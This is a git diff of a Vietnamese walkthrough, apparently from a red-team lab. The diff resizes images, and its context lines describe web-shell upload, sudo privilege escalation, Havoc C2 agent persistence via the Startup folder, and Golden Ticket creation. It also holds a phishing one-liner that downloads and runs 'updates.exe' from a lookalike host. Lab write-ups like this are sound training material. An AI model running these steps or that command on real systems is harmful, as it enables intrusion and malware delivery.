@@ -40,8 +40,8 @@ Attacker có thể xâm nhập vào hệ thống thông qua 2 cách tiếp cận
 Truy cập vào trang chủ chính `home.phongbat.com' ta chỉ thấy được các giao diện thông thường, test qua vài lỗ hổng trong OWASP nhưng không có gì bất thường.
 
 <p align="center">
-    <img src="/Images/Picture3.png" width="45%" />
-    <img src="/Images/Picture3-1.png" width="45%" />
+    <img src="/Images/Picture3.png" />
+    <img src="/Images/Picture3-1.png"  />
 </p>
 
 Tiến hành scandir xem có thư mục nào ẩn không ta tìm được một vài directory ẩn: `/robots.txt`,`/admin`.
@@ -53,8 +53,8 @@ Tuy nhiên, bypass bằng cách tải lên shell.php.jpg và chiếm quyền Web
 
 
 <p align="center">
-    <img src="/Images/Picture5.png" width="45%" />
-    <img src="/Images/Picture6.png" width="45%" />
+    <img src="/Images/Picture5.png"  />
+    <img src="/Images/Picture6.png"  />
 </p>
 
 
@@ -75,8 +75,8 @@ User này được cấu hình chạy nano với sudo vì vậy ta dễ dàng l�
 ![](/Images/Picture10.png)
 ![](/Images/Picture10-3.png)
 <p align="center">
-    <img src="/Images/Picture10-1.png" width="45%" />
-    <img src="/Images/Picture10-2.png" width="45%" />
+    <img src="/Images/Picture10-1.png"  />
+    <img src="/Images/Picture10-2.png" />
 </p>
 
 Ta đăng nhập qua ssh sử dụng credential của ip `12.3.3.10`.
@@ -104,8 +104,8 @@ Chúng ta sẽ tạo một agent tên là teams.exe và gửi nó qua cho máy d
 
 ![](/Images/Picture13-2.png)
 <p align="center">
-    <img src="/Images/Picture13-3.png" width="45%" />
-    <img src="/Images/Picture13-4.png" width="45%" />
+    <img src="/Images/Picture13-3.png" />
+    <img src="/Images/Picture13-4.png"  />
 </p>
 
 Vậy là ta đã thành công cắm C2 Server vào máy `client1`. Ta cần phải thêm file `teams.exe` này vào startup của máy để khi máy được khởi động, HavocCilent sẽ tự động kết nối. Chúng ta sẽ cd vào đường dẫn sau và tải file agent về, khi đó mục startup của máy sẽ có tiến trình agent này, khi máy khởi động thì tiến trình này sẽ tự động kích hoạt. Path: `C:\Users\clent1\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`.
@@ -161,8 +161,8 @@ Script: ``` curl ms-updates.online/updates.exe -o updates.exe & updates.exe ```
 Giả sử user 'client2' đã tải về. Khi user này mở ra và bấm vào file, script sẽ được chạy, tải file agent có tên `updates.exe` về máy và tự khởi chạy.
 
 <p align="center">
-    <img src="/Images/Picture19.png" width="45%" />
-    <img src="/Images/Picture19-1.png" width="45%" />
+    <img src="/Images/Picture19.png" />
+    <img src="/Images/Picture19-1.png"  />
 </p>
 
 ![](/Images/Picture19-2.png)
@@ -189,14 +189,14 @@ Ta thử sử dụng credential này bằng rdp.
 Sau đó ta sẽ tạo backdoor và Tạo Golden Ticket để duy trì quyền truy cập lâu dài.
 
 <p align="center">
-    <img src="/Images/Picture23.png" width="45%" />
-    <img src="/Images/Picture23-2.png" width="45%" />
+    <img src="/Images/Picture23.png"  />
+    <img src="/Images/Picture23-2.png"  />
 </p>
 
 
 <p align="center">
-    <img src="/Images/Picture24.png" width="45%" />
-    <img src="/Images/Picture24-1.png" width="45%" />
+    <img src="/Images/Picture24.png"  />
+    <img src="/Images/Picture24-1.png"  />
 </p>
 
 
